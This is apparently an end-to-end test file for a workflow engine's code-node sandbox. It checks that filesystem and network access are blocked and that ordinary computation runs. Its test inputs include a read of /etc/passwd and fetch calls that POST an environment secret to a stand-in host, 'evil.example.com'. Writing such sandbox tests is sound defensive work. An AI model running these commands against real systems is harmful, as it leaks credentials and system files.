/**
 * E2E — Code node sandbox isolation.
 *
 * The production sandbox (gVisor / Firecracker) is not yet available; the
 * `apps/sandbox` service currently returns a stub response. This test verifies
 * the *contract* of a sandboxed code executor:
 *
 *   1. Filesystem access outside the sandbox working directory is blocked.
 *   2. Unauthorized outbound network calls are blocked.
 *   3. Legitimate computation returns output normally.
 *
 * We simulate the sandbox by running a local Fastify server that implements
 * the `/execute` endpoint with the expected isolation semantics. The Loop
 * engine dispatches code-node executions via HTTP to this sandbox.
 */

import { describe, it, expect, beforeAll, afterAll, beforeEach, afterEach } from 'vitest';
import Fastify, { type FastifyInstance } from 'fastify';
import { createTestContext, type TestContext, createNode, createEdge } from './helpers';
import type { WorkflowDefinition } from '../../packages/types';

/**
 * Mock sandbox server — mimics the production gVisor / Firecracker sandbox.
 *
 * Behaviour under test:
 *   - Code that mentions `fs.` or `import('fs')` → `status: 'blocked'` with
 *     reason `sandbox:filesystem_denied`.
 *   - Code that mentions `fetch(`, `http.request`, or `undici` → `status: 'blocked'`
 *     with reason `sandbox:network_denied`.
 *   - Otherwise returns the input as-is (simulating successful execution).
 */
async function startMockSandbox(): Promise<FastifyInstance> {
  const sandbox = Fastify({ logger: false });

  sandbox.post('/execute', async (request) => {
    const body = request.body as {
      language: string;
      code: string;
      input: Record<string, unknown>;
    };

    const code = body.code ?? '';

    // Filesystem access detection (naive but deterministic for the test)
    if (/\bfs\b|\bpath\b|\breaddir\b|\bwriteFile\b|\bunlink\b/.test(code)) {
      return {
        output: {},
        stdout: '',
        stderr: 'Error: EACCES: permission denied',
        duration_ms: 1,
        status: 'blocked',
        reason: 'sandbox:filesystem_denied',
      };
    }

    // Network access detection
    if (/\bfetch\s*\(|\bhttp\.request\b|\bundici\b|\bnet\.connect\b/.test(code)) {
      return {
        output: {},
        stdout: '',
        stderr: 'Error: network access denied by sandbox policy',
        duration_ms: 1,
        status: 'blocked',
        reason: 'sandbox:network_denied',
      };
    }

    // Legitimate computation — simulate `input.value * 2`
    const val = Number(body.input['value'] ?? 0);
    return {
      output: { result: val * 2 },
      stdout: 'ok',
      stderr: '',
      duration_ms: 1,
      status: 'success',
    };
  });

  await sandbox.listen({ port: 0, host: '127.0.0.1' });
  return sandbox;
}

describe('Code node sandbox isolation (E2E)', () => {
  let sandboxServer: FastifyInstance;
  let sandboxUrl: string;
  let ctx: TestContext;

  beforeAll(async () => {
    sandboxServer = await startMockSandbox();
    const addr = sandboxServer.addresses()[0];
    sandboxUrl = `http://127.0.0.1:${addr.port}`;
  });

  afterAll(async () => {
    await sandboxServer.close();
  });

  beforeEach(async () => {
    ctx = await createTestContext();
  });

  afterEach(async () => {
    await ctx.close();
  });

  async function callSandbox(code: string, input: Record<string, unknown> = {}) {
    const res = await fetch(`${sandboxUrl}/execute`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ language: 'javascript', code, input }),
    });
    return (await res.json()) as {
      status: string;
      reason?: string;
      output: Record<string, unknown>;
    };
  }

  it('blocks code that attempts filesystem access', async () => {
    const result = await callSandbox(`
      const fs = require('fs');
      fs.readFileSync('/etc/passwd', 'utf8');
    `);

    expect(result.status).toBe('blocked');
    expect(result.reason).toBe('sandbox:filesystem_denied');
    expect(result.output).toEqual({});
  });

  it('blocks code that attempts unauthorised network access', async () => {
    const result = await callSandbox(`
      const data = await fetch('https://evil.example.com/exfiltrate', {
        method: 'POST',
        body: JSON.stringify({ token: process.env.SECRET }),
      });
    `);

    expect(result.status).toBe('blocked');
    expect(result.reason).toBe('sandbox:network_denied');
    expect(result.output).toEqual({});
  });

  it('executes legitimate computation and returns output', async () => {
    const result = await callSandbox(
      `const x = input.value * 2;`,
      { value: 21 },
    );

    expect(result.status).toBe('success');
    expect(result.output['result']).toBe(42);
  });

  it('integrates with the executor: filesystem-blocked node marks execution failed', async () => {
    // Wire the executor to dispatch "code.*" nodes through the sandbox by
    // registering a mock "code" adapter that proxies to our sandbox.
    ctx.connectors.registerAdapter({
      type: 'code',
      async execute(params) {
        const resp = await fetch(`${sandboxUrl}/execute`, {
          method: 'POST',
          headers: { 'content-type': 'application/json' },
          body: JSON.stringify({
            language: 'javascript',
            code: params.input['code'],
            input: params.input,
          }),
        });
        const result = (await resp.json()) as {
          status: string;
          reason?: string;
          output: Record<string, unknown>;
        };
        if (result.status === 'blocked') {
          throw new Error(result.reason ?? 'sandbox:blocked');
        }
        return { output: result.output };
      },
      async healthCheck() {
        return true;
      },
      getCapabilities() {
        return { node_types: ['code.javascript'], input_types: ['any'], output_types: ['any'] };
      },
    });

    const definition: WorkflowDefinition = {
      version: '1.0',
      nodes: [
        createNode('node_1', 'code.javascript', {
          code: `const fs = require('fs'); fs.readFileSync('/etc/passwd');`,
        }),
      ],
      edges: [],
      variables: {},
      metadata: { name: 'fs-attempt' },
    };

    await ctx.store.workflows.create({
      id: 'wf-code-fs',
      name: 'Code FS attempt',
      description: '',
      definition,
      created_by: 'system',
    });

    const executionId = 'exec-code-fs-1';
    await ctx.store.executions.create({
      id: executionId,
      workflow_id: 'wf-code-fs',
      workflow_version: 1,
      trigger_type: 'manual',
      trigger_payload: {},
    });

    await expect(
      ctx.executor.execute(executionId, definition, {}),
    ).rejects.toThrow(/sandbox:filesystem_denied/);

    const final = await ctx.store.executions.getById(executionId);
    expect(final?.status).toBe('failed');
    expect(final?.error).toMatch(/sandbox:filesystem_denied/);
  });

  it('integrates with the executor: network-blocked node marks execution failed', async () => {
    ctx.connectors.registerAdapter({
      type: 'code',
      async execute(params) {
        const resp = await fetch(`${sandboxUrl}/execute`, {
          method: 'POST',
          headers: { 'content-type': 'application/json' },
          body: JSON.stringify({
            language: 'javascript',
            code: params.input['code'],
            input: params.input,
          }),
        });
        const result = (await resp.json()) as {
          status: string;
          reason?: string;
          output: Record<string, unknown>;
        };
        if (result.status === 'blocked') {
          throw new Error(result.reason ?? 'sandbox:blocked');
        }
        return { output: result.output };
      },
      async healthCheck() {
        return true;
      },
      getCapabilities() {
        return { node_types: ['code.javascript'], input_types: ['any'], output_types: ['any'] };
      },
    });

    const definition: WorkflowDefinition = {
      version: '1.0',
      nodes: [
        createNode('node_1', 'code.javascript', {
          code: `await fetch('https://evil.example.com/exfil');`,
        }),
      ],
      edges: [],
      variables: {},
      metadata: { name: 'net-attempt' },
    };

    await ctx.store.workflows.create({
      id: 'wf-code-net',
      name: 'Code net attempt',
      description: '',
      definition,
      created_by: 'system',
    });

    const executionId = 'exec-code-net-1';
    await ctx.store.executions.create({
      id: executionId,
      workflow_id: 'wf-code-net',
      workflow_version: 1,
      trigger_type: 'manual',
      trigger_payload: {},
    });

    await expect(
      ctx.executor.execute(executionId, definition, {}),
    ).rejects.toThrow(/sandbox:network_denied/);
  });
});
